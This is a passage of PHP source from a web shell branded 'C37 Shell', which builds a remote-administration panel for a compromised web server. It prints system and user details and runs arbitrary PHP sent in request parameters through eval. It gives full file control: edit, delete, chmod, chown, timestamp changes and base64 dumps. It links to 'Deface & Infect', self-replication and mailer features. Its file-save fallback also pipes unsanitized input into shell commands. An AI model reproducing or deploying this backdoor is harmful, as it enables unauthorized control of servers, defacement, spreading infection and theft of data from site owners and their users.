		<base href="'; $For = 'http'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $For .= 's'; } echo $For,'://',$_SERVER['SERVER_NAME'],':',$_SERVER['SERVER_PORT']; if (urldecode($_SERVER['REQUEST_URI']) !== $_SERVER['PHP_SELF'] . '?') { echo htmlspecialchars($_SERVER['REQUEST_URI']); } else { echo htmlspecialchars($_SERVER['PHP_SELF']); }; echo '" />
	</head>
	<body>
		<center style="background-color:#1C1C1C;border: 1px solid red;margin: 1em;padding: 1em 3em;position: relative;">';
		if (!$ShowFiles) {
			echo '<div style="background-color:#1C1C1C;">
				<font color="red">:: Error While Changing Directory :: (Could not Open ',htmlspecialchars($_GET['dir']),')</font>';
				GetLastError();
				echo '</div>
				<br /><br />
				<button title="Go Back in history (using JavaScript)" onclick="window.history.go(-1)">Go Back?</button>
				<br /><br />';
		}
echo '<div style="color:#E5E5E5;border-bottom: 1px solid #999;overflow:auto;max-width:100%;">
	<table>
		<tr>
			<td title="Server Details" style="text-align:left;">
				<b>Server Signature</b>: ';
				if (!empty($_SERVER['SERVER_SIGNATURE'])) { echo $_SERVER['SERVER_SIGNATURE'],'<br />'; }
				elseif (!empty($_SERVER['SERVER_SOFTWARE'])) { echo $_SERVER['SERVER_SOFTWARE'],'<br />'; }
				elseif (function_exists('apache_get_version')) { echo apache_get_version(),'<br />'; }
				echo '<b>System</b>: ';
				if (function_exists('php_uname')) { echo php_uname('a'); }
				elseif (function_exists('posix_uname')) {
					foreach (posix_uname() AS $key => $value) { echo $value,' '; }
				}
				elseif (function_exists('system') || function_exists('passthru') || function_exists('shell_exec') || function_exists('exec') || function_exists('popen')) {
					if ($IsWIN) {
						if (function_exists('system')) { system('ver'); }
						elseif (function_exists('shell_exec')) { echo shell_exec('ver'); }
						elseif (function_exists('exec')) { $ExecArray = array(); exec('ver',$ExecArray); foreach ($ExecArray AS $Line) { echo $Line; } }
						elseif (function_exists('passthru')) { passthru('ver'); }
						elseif (function_exists('popen')) { $Read=''; $Handle = popen('ver','r'); while ($Read = fread($Handle,2096)) { echo $Read; } pclose($Handle); }
					}
					else {
						if (function_exists('system')) { system('uname -a'); }
						elseif (function_exists('shell_exec')) { echo shell_exec('uname -a'); }
						elseif (function_exists('exec')) { $ExecArray = array(); exec('uname -a',$ExecArray); foreach ($ExecArray AS $Line) { echo $Line; } }
						elseif (function_exists('passthru')) { passthru('uname -a'); }
						elseif (function_exists('popen')) { $Read=''; $Handle = popen('uname -a','r'); while ($Read = fread($Handle,2096)) { echo $Read; } pclose($Handle); }
					}
				}
				elseif (function_exists('curl_version')) {
					$cURLinfo = curl_version();
					echo $cURLinfo['host'];
				}
				else { echo PHP_OS; }
				echo '<br /><br />
				<a href="?action=info" title="phpinfo()" target="_blank" style="text-decoration:underline;">
					<b>PHP Version</b>: ',PHP_VERSION,
				'</a>';
				if (function_exists('php_sapi_name')) { echo ' (',php_sapi_name(),')'; }
				elseif (is_defined('PHP_SAPI')) { echo ' (',PHP_SAPI,')'; }
				echo ' <b>Zend Version</b>: ',zend_version(),
				'<br />
				<b>Safe Mode</b>: 
				<font color="';
				echo ((ini_get('safe_mode')||strtolower(ini_get('safe_mode')) === 'on') ? 'red">ON (Secure)' : 'green">OFF (Not Secure)')
				,'</font> 
				[<a style="text-decoration:underline;" href="?action=eval&amp;code=echo \'&lt;h3>Disabled Functions:&lt;/h3&gt;\',@ini_get(\'disable_functions\'),\'&lt;h3&gt;Disabled Classes:&lt;/h3&gt;\',@ini_get(\'disable_classes\');" target="_blank" title="Show PHP Disabled Functions&amp;Classes (php.ini)">Disabled Functions&Classes</a>]
				<br />';
				if (!$IsWIN) {
					if (function_exists('system') || function_exists('passthru') || function_exists('shell_exec') || function_exists('exec') || function_exists('popen')) {
						if (function_exists('system')) { system('id'); }
						elseif (function_exists('shell_exec')) { echo shell_exec('id'); }
						elseif (function_exists('exec')) { $ExecArray = array(); exec('id',$ExecArray); foreach ($ExecArray AS $Line) { echo $Line; } }
						elseif (function_exists('passthru')) { passthru('id'); }
						elseif (function_exists('popen')) { $Read=''; $Handle = popen('id','r'); while ($Read = fread($Handle,2096)) { echo $Read; } pclose($Handle); }
					}
					else {
						if (function_exists('getmyuid')) { $UID = getmyuid(); }
						elseif (function_exists('fileowner')) { $UID = fileowner(__FILE__); }
						if (isset($UID)) {
							echo '<b>UID</b>: ', $UID;
							if (function_exists('posix_getpwuid')) { $ID = posix_getpwuid($UID); echo ' (',$ID['name'],')'; }
							elseif (function_exists('get_current_user')) { echo ' (',get_current_user(),')'; }
						}
						else { if (function_exists('get_current_user')) { echo '<b>User:</b> ',get_current_user(),')'; } }

						if (function_exists('getmygid')) { $GID = getmygid(); }
						elseif (function_exists('filegroup')) { $GID = filegroup(__FILE__); }
						elseif (isset($ID['gid'])) { $GID = $ID['gid']; }
						if (isset($GID)) {
							echo ' <b>GID</b>: ', $GID;
							if (function_exists('posix_getgrgid')) { $ID = posix_getgrgid($GID); echo ' (',$ID['name'],')'; }
						}
					} 
				}
				else {
					echo '<a style="text-decoration:underline;" href="?action=eval&amp;code=echo\'&lt;b&gt;Drives:&lt;/b&gt; \';foreach(range(\'A\',\'Z\') AS $DRIVE) { if(is_dir($DRIVE.\':\\\\\')) { echo\'&lt;a href=\\\'?dir=\',$DRIVE,\':\\\'&gt;[\',$DRIVE,\']&lt;/a&gt; \'; }}" target="_blank">[VIEW DRIVES]</a>';
					if (function_exists('getenv')) {
						echo ' <b>Logged User:</b> ',getenv('USERNAME');
					}
					if (function_exists('get_current_user')) {
						echo ' (<b>Owner</b>: ',get_current_user(),')';
					}
				}
				if (function_exists('getmypid')) { echo ' <b>PID</b>: ' . getmypid(); }
				echo '<br />
				<b>Server IP</b>: ',$_SERVER['SERVER_ADDR'],
				' - <b>Host</b>: ',gethostbyaddr($_SERVER['SERVER_ADDR']),
				'<br /><b>Port</b>: ',$_SERVER['SERVER_PORT'],
				' - <b>Admin</b>: ',$_SERVER['SERVER_ADMIN'];
				$T = array('Bytes','KiB','MiB','GiB','TiB','PiB','EiB','ZiB','YiB');
				$i = 0; $B = diskfreespace($CDIR); $A = disk_total_space($CDIR);
				while ($B>=1024) { $B/=1024;++$i; }
				$Space1=$T[$i]; $i = 0;
				while ($A>=1024) { $A/=1024;++$i; }
				$Space2=$T[$i];
				printf('<br /><br /><b>Free Disk Space: %.3f %s Out of %.3f %s (%.2f%%)',$B,$Space1,$A,$Space2,($B/$A) * 100);
				array_shift($T);
				echo '</b>
				<br /><br />
				<form action="" method="get" id="Go" style="font-weight:bold;">
					<input type="text" id="dir" name="dir" value="',$CDIR,'" style="width:270px;background-color:#000000;border-width:0px;margin-right:3px;" /> 
					<a onclick="javascript:document.getElementById(\'Go\').submit();" style="cursor:pointer;" title="Go to Directory">Enter</a> [<a href="?action=file&amp;act=chmod&amp;file=',urlencode($CDIR),'&amp;dir=',$SCDIR,'"><font';
					$A = GetPerms($CDIR); $B = substr($A,7);
					if ($B === '--x' || $B === '---') { echo ' color="red">'; } else { echo ' color="green">'; }
				echo $A.'</font></a>]</form>';
			echo '</td>
			<td style="padding-left:60px;" title="C37">
				<a href="?dir=',$SCDIR,'" style="outline:0;"><img src="?action=img&amp;image=c37" width="307" height="161" alt="C37 Shell" title="Go to the file explorer" /></a>
			</td>
		</tr>
	</table>
	<strong style="font-size:12px;">
		<img title="Go back in history (Using JavaScript)" src="?action=img&amp;image=backb" width="20" height="20" onclick="javascript:window.history.go(-1)" alt="Back" /> 
		<img title="Go forward in history (Using JavaScript)" src="?action=img&amp;image=forwardb" width="20" height="20" onclick="javascript:window.history.go(1)" alt="Forward" /> 
		[<a title="Return to \'',dirname(__FILE__),'\'" href="?">Home</a>] 
		[<a title="Find Files and Directories" href="?action=search&amp;dir=',$SCDIR; if (isset($_GET['search'])) { echo '&amp;',urlencode($_GET['search']); } if (isset($_GET['type'])) { echo '&amp;',urlencode($_GET['type']); } if (isset($_GET['casein'])) { echo '&amp;',urlencode($_GET['casein']); } echo '">Search</a>] 
		[<a title="Encode & calculate hashsums of a string, convert number bases and more" href="?action=encoder&amp;dir=',$SCDIR,'">Encoder</a>] 
		[<a title="execute PHP Code" href="?action=eval&amp;dir=',$SCDIR,'">Eval</a>] 
		[<a title="Send E-Mail From this Server" href="?action=mailer&amp;dir=',$SCDIR,'">Mail</a>] 
		[<a title="Determine the type of a specific Hash" href="?action=HashAnalyzer&amp;dir=',$SCDIR,'">Hash Analyzer</a>]';
		/* [<a title="Manage SQL Server" href="?action=ManSQL&amp;dir=',$SCDIR,'">SQL Man.</a>] */
		echo ' [<a title="Change content of the files in the Directory" href="?action=MassDeface&amp;dir=',$SCDIR,'">Deface &amp; Infect</a>] 
		[<a title="Make another copy of the shell" href="?action=Replicator">Replicate</a>] ';
		/* [<a title="Use this server as a proxy server" href="?action=Proxy">Proxy</a>] */
		echo '[<a title="Set password for the shell" href="?action=passset">Password</a>] 
		[<span title="Delete the shell from the server" style="color:red;" onmouseover="this.style.textDecoration = \'underline\';this.style.cursor = \'pointer\';" onmouseout="this.style.textDecoration = \'none\';" onclick="javascript:var Ans = confirm(\'Are you sure?\'); if (Ans == 1) { window.location = \'?action=selfremove\'; }">Remove Shell</span>]
		</strong>
	<br /><br />
</div>
<br /><br />',"\r\n";

if ($IsAction) {
	if ($_GET['action'] === 'eval') {
		if (isset($_REQUEST['code'])) {
			$NA = substr($_REQUEST['code'], 0, 2);
			if (substr($_REQUEST['code'], 0, 5) === '<?php') { $_REQUEST['code'] =  substr($_REQUEST['code'], 5); }
			elseif ($NA === '<?' || $NA === '<%') { $_REQUEST['code'] =  substr($_REQUEST['code'], 2); }
			$ND = substr($_REQUEST['code'], strlen($_REQUEST['code']) -2);
			if ($ND === '?>' || $ND === '%>') { $_REQUEST['code'] =  substr($_REQUEST['code'], 0, -2); }
		}
		if (isset($_POST['highlight']) && (function_exists('highlight_string') || function_exists('show_source'))) {
			echo '<h3>Highlighted code:</h3>
			<div style="overflow:auto;max-height:320px;background-color:white;text-align:left;padding:2px;">';
			if (function_exists('highlight_string')) { highlight_string("<?php\r\n".$_REQUEST['code']."\r\n?>"); }
			else { show_source("<?php\r\n".$_REQUEST['code']."\r\n?>"); }
			echo '</div>';
		}
		if (isset($_REQUEST['code']) && !isset($_POST['textarea'])) {
			echo '<div style="text-align:left;">',eval($_REQUEST['code']),'</div>';
		}
		else {
			echo '<form action="" method="post"><h3>PHP Code'; if (isset($_REQUEST['code'])) { echo ' Results'; } echo ':</h3><textarea name="code" id="code" cols="90" rows="15" spellcheck="false">';
			if (isset($_REQUEST['code'])) {
				echo $_REQUEST['code'], '</textarea><br /><textarea cols="90" rows="15" readonly="readonly" spellcheck="false">', eval($_REQUEST['code']) , '</textarea>';
			}
			else { echo '</textarea>'; }
			echo '<br /><br />
			<input type="submit" value="Exec Code" /> 
			Results in TextArea? <input type="checkbox" checked="checked" name="textarea" id="textarea" />';
			if (function_exists('highlight_string') || function_exists('show_source')) { echo ' Highlight code <input type="checkbox" name="highlight" id="highlight"'; if (isset($_POST['highlight'])) { echo ' checked="checked"'; } echo ' />'; }
			echo '</form>
			<br /><br />If you don\'t see any output from the script when you should, please check it for Errors.';
		}
	}
	elseif ($_GET['action'] === 'file' && $ShowFiles) {
		if (is_file($_GET['file']) || ($_REQUEST['act'] === 'chmod' && is_dir($_GET['file']))) {
			if (!function_exists('file_get_contents')) {
				function file_get_contents($File) {
					$handle = fopen($File, 'rb');
					$contents = fread($handle,sprintf('%u',filesize($File)));
					fclose($handle);
					return $contents;
				}
			}
			if (isset($_REQUEST['act'])) {
				if ($_REQUEST['act'] === 'rename') {
					if (isset($_REQUEST['name'])) {
						echo 'File Renaming - <font ';
						if (rename($_GET['file'],$_REQUEST['name'])) { echo 'color="green">Was Successful.'; }
						else { echo 'color="red">Failed.'; }
						echo '</font>';
					}
					else {
						echo '<h3>Rename\Move \'',htmlspecialchars($_GET['file']),'\' To:</h3>
						<form method="post" action="?action=file&amp;act=rename&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">
							<input type="text" id="name" name="name" /> 
							<input type="submit" value="Rename" />
						</form>';
					}
				}
				elseif ($_GET['act'] === 'stat') {
					$Stat = stat($_GET['file']);
					echo '<h3>',htmlspecialchars($_GET['file']),'</h3>
					<table border="1" cellspacing="1" cellpadding="3">
						<tr>
							<td>
								<b>Device Number</b>
							</td>
							<td>',$Stat['dev'],'</td>
						</tr>
						<tr>
							<td>
								<b>Inode Number</b>
							</td>
							<td>',$Stat['ino'],'</td>
						</tr>
						<tr>
							<td>
								<b>Inode protection mode</b>
							</td>
							<td>',$Stat['mode'],'</td>
						</tr>
						<tr>
							<td>
								<b>Number of Links</b>
							</td>
							<td>',$Stat['nlink'],'</td>
						</tr>
						<tr>
							<td>
								<b>User ID</b>
							</td>
							<td>',$Stat['uid'],'</td>
						</tr>
						<tr>
							<td>
								<b>Group ID</b>
							</td>
							<td>',$Stat['gid'],'</td>
						</tr>
						<tr>
							<td>
								<b>Device type, if inode device</b>
							</td>
							<td>',$Stat['rdev'],'</td>
						</tr>
						<tr>
							<td>
								<b>Size in Bytes</b>
							</td>
							<td>',$Stat['size'],'</td>
						</tr>
						<tr>
							<td>
								<b>Time of last access</b>
							</td>
							<td>',$Stat['atime'],' (',date('F d Y H:i:s.',$Stat['atime']),')</td>
						</tr>
						<tr>
							<td>
								<b>Time of last modification</b>
							</td>
							<td>',$Stat['mtime'],' (',date('F d Y H:i:s.',$Stat['mtime']),')</td>
						</tr>
						<tr>
							<td>
								<b>Time of last inode change</b>
							</td>
							<td>',$Stat['ctime'],' (',date('F d Y H:i:s.',$Stat['ctime']),')</td>
						</tr>
						<tr>
							<td>
								<b>Blocksize of filesystem IO</b>
							</td>
							<td>',$Stat['blksize'],'</td>
						</tr>
						<tr>
							<td style="padding-right:20px;">
								<b>Number of 512-byte blocks allocated</b>
							</td>
							<td>',$Stat['blocks'],'</td>
						</tr>
						</table>';
				}
				elseif ($_GET['act'] === 'chmod') {
					if (isset($_POST['Perms'])) {
						echo 'Changed File permissions - <font ';
						if (chmod($_GET['file'],base_convert((int)$_POST['Perms'], 8, 10))) { echo 'color="green">successfully (new file permissions: ',substr(sprintf('%o',fileperms($_REQUEST['file'])),-3),').'; }
						else { echo 'color="red">unsuccessfully.'; }
						echo '</font>';
					}
					else {
						$Permissions = substr(sprintf('%o',fileperms($_REQUEST['file'])),-3);
						echo '<h3>Change \'',htmlspecialchars($_GET['file']),'\' Permissions to:</h3>
						<form method="post" action="?action=file&amp;act=chmod&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">
						<input type="text" size="4" id="Perms" name="Perms" maxlength="3" onkeyup="javascript:ConfigureCheckBoxesPermissions();" value="',$Permissions,'" /> 
						<input type="submit" value="Chmod" /></form><br /><table><tr><th></th><th>r</th><th>w</th><th>x</th></tr>
						<tr><th>Owner:</th><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'o\');" id="or"'; if ($Permissions[0] >= '4') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'o\');" id="ow"'; if ($Permissions[0] === '2' || $Permissions[0] === '3' || $Permissions[0] >= '6') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'o\');" id="ox"'; if ($Permissions[0] === '1' || $Permissions[0] === '3' || $Permissions[0] === '5' || $Permissions[0] === '7') { echo ' checked="checked"'; } echo ' /></td></tr>
						<tr><th>Group:</th><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'g\');" id="gr"'; if ($Permissions[1] >= '4') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'g\');" id="gw"'; if ($Permissions[1] === '2' || $Permissions[1] === '3' || $Permissions[1] >= '6') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'g\');" id="gx"'; if ($Permissions[1] === '1' || $Permissions[1] === '3' || $Permissions[1] === '5' || $Permissions[1] === '7') { echo ' checked="checked"'; } echo ' /></td></tr>
						<tr><th>Others:</th><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'u\');" id="ur"'; if ($Permissions[2] >= '4') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'u\');" id="uw"'; if ($Permissions[2] === '2' || $Permissions[2] === '3' || $Permissions[2] >= '6') { echo ' checked="checked"'; } echo ' /></td><td><input type="checkbox" onclick="javascript:ConfigurePermissions(\'u\');" id="ux"'; if ($Permissions[2] === '1' || $Permissions[2] === '3' || $Permissions[2] === '5' || $Permissions[2] === '7') { echo ' checked="checked"'; } echo ' /></td></tr>
						</table><br />On Windows, The only permissions allowed for files are 666&444.<br />666 for writeable\readable and 444 for readable.<br />
						<script type="text/javascript">
						function ConfigurePermissions(user) {
							var NewPermsValue = document.getElementById(\'Perms\').value;
							var NewPermDigit = 0;
							if (!document.getElementById(user + \'x\').checked && !document.getElementById(user + \'r\').checked && !document.getElementById(user + \'w\').checked) { NewPermDigit = \'0\'; }
							else if (document.getElementById(user + \'x\').checked && !document.getElementById(user + \'r\').checked && !document.getElementById(user + \'w\').checked) { NewPermDigit = \'1\'; }
							else if (!document.getElementById(user + \'x\').checked && !document.getElementById(user + \'r\').checked && document.getElementById(user + \'w\').checked) { NewPermDigit = \'2\'; }
							else if (document.getElementById(user + \'x\').checked && !document.getElementById(user + \'r\').checked && document.getElementById(user + \'w\').checked) { NewPermDigit = \'3\'; }
							else if (!document.getElementById(user + \'x\').checked && document.getElementById(user + \'r\').checked && !document.getElementById(user + \'w\').checked) { NewPermDigit = \'4\'; }
							else if (document.getElementById(user + \'x\').checked && document.getElementById(user + \'r\').checked && !document.getElementById(user + \'w\').checked) { NewPermDigit = \'5\'; }
							else if (!document.getElementById(user + \'x\').checked && document.getElementById(user + \'r\').checked && document.getElementById(user + \'w\').checked) { NewPermDigit = \'6\'; }
							else if (document.getElementById(user + \'x\').checked && document.getElementById(user + \'r\').checked && document.getElementById(user + \'w\').checked) { NewPermDigit = \'7\'; }
							if (user === \'o\') { document.getElementById(\'Perms\').value = NewPermDigit + NewPermsValue[1] + NewPermsValue[2]; }
							else if (user === \'g\') { document.getElementById(\'Perms\').value = NewPermsValue[0] + NewPermDigit + NewPermsValue[2]; }
							else { document.getElementById(\'Perms\').value = NewPermsValue[0] + NewPermsValue[1] + NewPermDigit; }
							
						}
						function ConfigureCheckBoxesPermissions() {
							var i = 0; var PermDigit = 0; var PermCheck = \'\';
							for (;i<3;i++) {
								PermDigit = document.getElementById(\'Perms\').value[i];
								if (i === 0) { PermCheck = \'o\'; }
								else if (i === 1) { PermCheck = \'g\'; }
								else { PermCheck = \'u\'; }
								
								if (PermDigit >= \'4\' && PermDigit < \'8\') { document.getElementById(PermCheck + \'r\').setAttribute(\'checked\',\'checked\'); }
								else { document.getElementById(PermCheck + \'r\').removeAttribute(\'checked\'); }
								
								if (PermDigit === \'2\' || PermDigit === \'3\' || (PermDigit >= \'6\' && PermDigit < \'8\')) { document.getElementById(PermCheck + \'w\').setAttribute(\'checked\',\'checked\'); }
								else { document.getElementById(PermCheck + \'w\').removeAttribute(\'checked\'); }
								
								if (PermDigit === \'1\' || PermDigit === \'3\' || PermDigit === \'5\' || PermDigit === \'7\') { document.getElementById(PermCheck + \'x\').setAttribute(\'checked\',\'checked\'); }
								else { document.getElementById(PermCheck + \'x\').removeAttribute(\'checked\'); }
							}
						}
						</script>';
					}
				}
				elseif ($_GET['act'] === 'delete') { if (unlink($_REQUEST['file'])) { echo '\'',htmlspecialchars($_REQUEST['file']),'\' was successfully Deleted.'; } else { echo 'Error while deleting file.<br />';GetLastError(); }}
				elseif ($_GET['act'] === 'copy') {
					if (isset($_REQUEST['dest'])) {
						if (copy($_REQUEST['file'],$_REQUEST['dest'])) {
							echo 'File was copied successfully from \'',realpath($_REQUEST['file']),'\' to \'',$_REQUEST['dest'],'\'.';
						}
						else { echo 'Error while copying file.<br />';GetLastError(); }
					}
					else {
						echo '<form action="?dir=',$SCDIR,'&amp;action=file&amp;act=copy&amp;file=',urlencode($_REQUEST['file']),'" method="post">
							<h3>Copy \'',htmlspecialchars($CDIR.$_REQUEST['file']),'\' to file:</h3>
							<input type="text" name="dest" id="dest" /> 
							<input type="submit" value="Copy" />
						</form>
						<br /><br />
						<span style="color:red;">Warning: If the destination file already exists, it will be overwritten.</span>';
					}
				}
				elseif ($_GET['act'] === 'chown') {
					if (isset($_POST['Owner'])) {
						echo 'Changing File Owner - <font ';
						if (chown($_GET['file'],$_POST['Owner'])) { echo 'color="green">Was successful.</font>'; }
						else {
							echo 'color="red">Failed.</font>';GetLastError();
						}
					}
					else {
						echo '<h3>Change \'',htmlspecialchars($_GET['file']),'\' Owner to:</h3>
						<form method="post" action="?action=file&amp;act=chown&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">
							<input type="text" size="21" id="Owner" name="Owner" value="Type Owner ID or Name" /> 
							<input type="submit" value="Change Owner" />
						</form>
						<br />Only the superuser may change the owner of a file.';
					}
				}				
				elseif ($_GET['act'] === 'chgrp') {
					if (isset($_POST['Group'])) {
						echo 'Changing File Group - <font ';
						if (chgrp($_GET['file'],$_POST['Group'])) { echo 'color="green">Was successful.</font>'; }
						else {
							echo 'color="red">Failed.</font>';GetLastError();
						}
					}
					else {
						echo '<h3>Change \'',htmlspecialchars($_GET['file']),'\' Group to:</h3>
						<form method="post" action="?action=file&amp;act=chmod&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">
							<input type="text" size="21" id="Group" name="Group" value="Type Group ID or Name" /> 
							<input type="submit" value="Change Group" />
						</form>
						<br />Only the superuser may change the group of a file arbitrarily;<br />other users may change the group of a file to any group of which that user is a member.';
					}
				}
				elseif ($_GET['act'] === 'touch') {
					if (isset($_POST['Touch'])) {
						$TOUCH = FALSE;
						echo 'Changing File Time - <font ';
						if ($_POST['Touchm'] === 'Modification Time') { $_POST['Touchm'] = time(); }
						if ($_POST['Toucha'] === 'Access Time') { $_POST['Toucha'] = time(); }
						if (touch($_GET['file'],$_POST['Touchm'],$_POST['Toucha'])) { echo 'color="green">Was successful.</font>'; }
						else {
							echo 'color="red">Failed.</font>';GetLastError();
						}
					}
					else {
						echo '<h3>Change \'',htmlspecialchars($_GET['file']),'\' Time to:</h3>
						<form method="post" action="?action=file&amp;act=touch&amp;file=',urlencode($_GET['file']),'&amp;dir=',$SCDIR,'">
							<input type="text" size="21" id="Touchm" name="Touchm" value="Modification Time" /><br />
							<input type="text" size="21" id="Toucha" name="Toucha" value="Access Time" /><br /><br />
							<input type="submit" value="Change Time" id="Touch" name="Touch" />
						</form>
						<br />Use UNIX Timestamp<br />To change file modification\access time of the file, Just leave the corresponding box with it\'s default value.';
					}
				}
				elseif ($_GET['act'] === 'base64') {
					echo '<h3>',htmlspecialchars($_GET['file']),' Base64 Encoded:</h3>
					<br /><textarea cols="90" rows="25" style="overflow:auto;" readonly="readonly">',base64_encode(file_get_contents($_GET['file'])),'</textarea>';
				}
				elseif ($_GET['act'] === 'compress') {
					if (isset($_POST['aname']) && isset($_POST['atype'])) {
						if ($_POST['atype'] === 'ZIP') {
							$Zip = new ZipArchive;
							$ArchiveName = $_POST['aname'];
							while (file_exists($ArchiveName.'.zip')) { $ArchiveName .= '7'; }
							$Zip->open($ArchiveName.'.zip',ZIPARCHIVE::CREATE);
							if ($Zip->addFile($_GET['file'])) { echo 'Compressed successfully, archive: <a href="?dir=',$SCDIR,'&amp;action=file&amp;file=',urlencode($ArchiveName),'.zip">',htmlspecialchars($ArchiveName),'.zip</a>'; } else { echo 'Could not compress file.'; }
							$Zip->close();
						}
						elseif ($_POST['atype'] === 'Bzip2') {
							$ArchiveName = $_POST['aname'];
							while (file_exists($ArchiveName.'.bz2')) { $ArchiveName .= '7'; }
							$Handle = bzopen($ArchiveName.'.bz2','w');
							if (bzwrite($Handle,file_get_contents($_GET['file'])) !== FALSE) { echo 'Compressed successfully, archive: <a href="?dir=',$SCDIR,'&amp;action=file&amp;file=',urlencode($ArchiveName),'.bz2">',htmlspecialchars($ArchiveName),'.bz2</a>'; } else { echo 'Could not compress file.'; }
							bzclose($Handle);
						}
						elseif ($_POST['atype'] === 'Gzip') {
							$ArchiveName = $_POST['aname'];
							while (file_exists($ArchiveName.'.gz')) { $ArchiveName .= '7'; }
							$Handle = gzopen($ArchiveName.'.gz','w');
							if (gzwrite($Handle,file_get_contents($_GET['file'])) !== FALSE) { echo 'Compressed successfully, archive: <a href="?dir=',$SCDIR,'&amp;action=file&amp;file=',urlencode($ArchiveName),'.bz2">',htmlspecialchars($ArchiveName),'.gz</a>'; } else { echo 'Could not compress file.'; }
							gzclose($Handle);
						}
					}
					echo '<h3>Compress ',htmlspecialchars($_GET['file']),':</h3>
					<br />
					<form method="post" action="">
						Create a 
						<select name="atype" id="atype">';
						if (class_exists('ZipArchive')) { echo '<option>ZIP</option>'; }
						if (function_exists('bzopen') && function_exists('bzwrite')) { echo '<option>Bzip2</option>'; }
						if (function_exists('gzopen') && function_exists('gzwrite')) { echo '<option>Gzip</option>'; }
						echo '</select> 
						archive named 
						<input type="text" id="aname" name="aname" value="',htmlspecialchars($_GET['file']),'" />
						<input type="submit" value="Compress file" />
					</form>
					<br />
					You do not need to write the archive extension.<br />
					The archive name will also be the compressed file name except when choosing ZIP, in that case, the compressed file name will be: ',htmlspecialchars($_GET['file']),'.
					';
				}
				elseif ($_GET['act'] === 'gzip') {
					if (function_exists('gzencode')) {
						echo '<h3>',htmlspecialchars($_GET['file']),' Gzip Compressed:</h3>
						<br />
						<textarea cols="90" rows="25" style="overflow:auto;" readonly="readonly">',gzencode(file_get_contents($_REQUEST['file'],9)),'</textarea>';
					}
					else { echo 'Can\'t Compress.'; }
				}
				elseif ($_GET['act'] === 'deflate') {
					if (function_exists('gzencode')) {
						echo '<h3>',htmlspecialchars($_GET['file']),' Deflate Compressed:</h3>
						<br />
						<textarea cols="90" rows="25" style="overflow:auto;" readonly="readonly">',gzencode(file_get_contents($_REQUEST['file']),9,FORCE_DEFLATE),'</textarea>';
					}
					else { echo 'Can\'t Compress.'; }	
				}
			}
			else {
				if (isset($_POST['save'])) {
					if (is_writable($_REQUEST['file'])) {
						if (isset($_REQUEST['fileEdit'])) {
							if (function_exists('file_put_contents')) {
								if (file_put_contents($_REQUEST['file'],$_REQUEST['fileEdit'])) {
									echo 'File Was Saved successfully!<br />';
								} else { echo 'File Could not be Saved.<br />';GetLastError(); }
							}
							elseif (function_exists('fopen') && (function_exists('fwrite') || function_exists('fputs') || function_exists('fputcsv'))) {
								    if (!$Handle = fopen($_REQUEST['file'], 'wb')) {
										echo 'Cannot open ',htmlspecialchars($_REQUEST['file']);
									}
									else {
										if (function_exists('fwrite')) {
											if (fwrite($Handle,$_REQUEST['fileEdit'])) {
												echo 'File Was Saved successfully!<br />';
											}
											else {
												echo 'Cannot write to ',htmlspecialchars($_REQUEST['file']);
											}
										}
										elseif (function_exists('fputs')) {
											if (fputs($Handle,$_REQUEST['fileEdit'])) {
												echo 'File Was Saved successfully!<br />';
											}
											else {
												echo 'Cannot write to ',htmlspecialchars($_REQUEST['file']);
											}										
										}
										else {
											if (fputcsv($Handle,array($_REQUEST['fileEdit']))) {
												echo 'File Was Saved successfully!<br />';
											}
											else {
												echo 'Cannot write to ',htmlspecialchars($_REQUEST['file']);
											}
										}
										
										fclose($Handle);
									}
							}
							elseif (function_exists('exec')) { exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); }
							elseif (function_exists('system')) { system('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); }
							elseif (function_exists('shell_exec')) { shell_exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); }
							elseif (function_exists('passthru')) { passthru('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); }
							elseif (function_exists('popen')) { pclose(popen('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file'])); }
							else { echo 'File Could not be Saved (no available functions).<br />'; }
						}
						else { echo 'Provide New Content.'; }
					}
					else { echo 'File is not Writeable.'; }
				}
				$Ext = substr(strrchr(strtolower($_GET['file']), '.'), 1);
				echo '<table>
					<tr>
						<td style="text-align:left;width:500px;overflow:auto;padding:10px;background-color:#282828;">
							<h3>';
								if (strpos($_SERVER['HTTP_USER_AGENT'],'Firefox') !== FALSE && strpos($_SERVER['HTTP_USER_AGENT'],'Windows') !== FALSE && !empty($Ext)) { echo '<img src="moz-icon://.',$Ext,'?size=16" alt="" width="16" height="16" /> '; }
								else { echo '<img src="?action=img&amp;ext=.',$Ext,'" alt="" width="16" height="16" /> '; }
								echo htmlspecialchars($_GET['file']),' <a target="_blank" href="?action=download&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'">
									<img src="?action=img&amp;image=down" width="20" height="20" alt="Download" />
								</a>
							</h3>
							MIME Type: ';
							if (class_exists('finfo')) { $finfo = new finfo(FILEINFO_MIME); echo $finfo->file($_REQUEST['file']); }
							elseif (function_exists('mime_content_type')) { echo mime_content_type($_REQUEST['file']); }
							elseif (function_exists('apache_lookup_uri')) { $Info = apache_lookup_uri($_REQUEST['file']); echo $Info->content_type; }
							else { echo 'N/A'; }
							echo '<br />
							File Perms: 
							<a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',urlencode($_GET['file']),'&amp;act=chmod">
								<font'; $A = GetPerms($_REQUEST['file']); $B = substr($A,7);
								if ($B === '--x'||$B === '---') { echo ' color="red">'; }
